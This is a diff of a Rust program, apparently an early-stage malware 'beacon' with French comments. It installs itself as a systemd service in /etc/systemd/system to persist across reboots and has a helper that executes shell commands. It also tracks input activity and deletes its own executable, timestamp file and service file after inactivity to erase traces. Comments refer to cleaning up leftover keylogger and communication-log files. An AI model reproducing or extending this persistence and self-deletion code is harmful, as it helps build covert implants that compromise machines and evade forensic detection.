@@ -1,25 +1,31 @@
 use std::{env, fs};
 use std::cell::RefCell;
-use std::error::Error;
 use std::fs::File;
 use std::process::Command;
-use std::time::Instant;
 use std::io::Write;
+use std::path::Path;
+use chrono::{DateTime, Local};
 
-thread_local!(static LAST_ENTRY : RefCell<Instant> = RefCell::new(Instant::now()));
+thread_local!(static LAST_ENTRY : RefCell<DateTime<Local>> = RefCell::new(
+    fs::read_to_string(TIME).unwrap_or_else(|_err| {
+        println!("{}", Local::now());
+        Local::now().to_string()
+    }).parse::<DateTime<Local>>().expect("failed to parse")
+));
+
+static TIME: &str = "./emit";
+static SERVICE: &str = "/etc/systemd/system/beacon_need.service";
 
 fn main() {
-    println!("{}",exec_command("echo Hello world"));
-    run().expect("Unable to Run");
+    run();
 }
 
 fn read_entry() -> &'static str {
     //placeholder fonction
     //TODO Truc pour récup' l'entrée
     let entry :&str = "switch toto";
-
     if !entry.is_empty() {
-        LAST_ENTRY.with(|instant| {*instant.borrow_mut() = Instant::now()});
+        update_time();
     }
     entry
 }
@@ -59,7 +65,7 @@ fn exec_command(cmd: &str) -> String {
 
 fn exec_on_boot() {
     let exe = env::current_exe().expect("Failed to get current exe");
-    let mut file = File::create("/etc/systemd/system/beacon_need.service").unwrap();
+    let mut file = File::create(SERVICE).unwrap();
     writeln!(file,
              "[Unit]\nDescription=Well it s for a beacon\n\n[Service]\nType=oneshot\nExecStart={}\n\n[Install]\nWantedBy=multi-user.target",
              exe.to_str().unwrap()).expect("Unable to Write");
@@ -74,8 +80,13 @@ fn exec_on_boot() {
 fn run() {
     //fonction principale d'execution
     let mut is_operating_as_transmition_tower = true; //determined the running mode of the beacon
-    exec_on_boot().expect("Unable to exec on startup");
+    exec_on_boot();
+    if !Path::new(TIME).try_exists().expect("cannot check existence") {
+        let mut ftime = File::create(TIME).unwrap();
+        writeln!(ftime, "{}", Local::now().to_rfc3339()).expect("failed to write in file");
+    }
 
+    println!("{}","just before loop");
     //boucle principale du programme
     loop {
         if is_operating_as_transmition_tower {
@@ -86,12 +97,24 @@ fn run() {
             println!("je suis actif");
         }
 
-        if LAST_ENTRY.with(|instant| {(*instant.borrow()).elapsed().as_secs() >= 2}) {
-            //Ne pas oublier de clear les fichiers residuels (keylogger et startup)
+        if LAST_ENTRY.with(|instant| {
+            Local::now().signed_duration_since(*instant.borrow()).num_seconds() >= 2
+        }) {
+            //Ne pas oublier de clear les fichiers residuels (startup et log de communication)
             //auto-destruction
             let exe = env::current_exe().expect("Failed to get current exe");
             fs::remove_file(&exe).expect("Failed to delete current exe");
+            fs::remove_file(TIME).expect("Failed to delete TIME");
+            fs::remove_file(SERVICE).expect("Failed to delete SERVICE");
             break
         }
     }
+}
+
+fn update_time() {
+    LAST_ENTRY.with(|time| {
+        *time.borrow_mut() = Local::now();
+        let mut ftime = File::create(TIME).unwrap();
+        writeln!(ftime, "{}", &*time.borrow().to_rfc3339())
+    }).expect("Failed to write");
 }
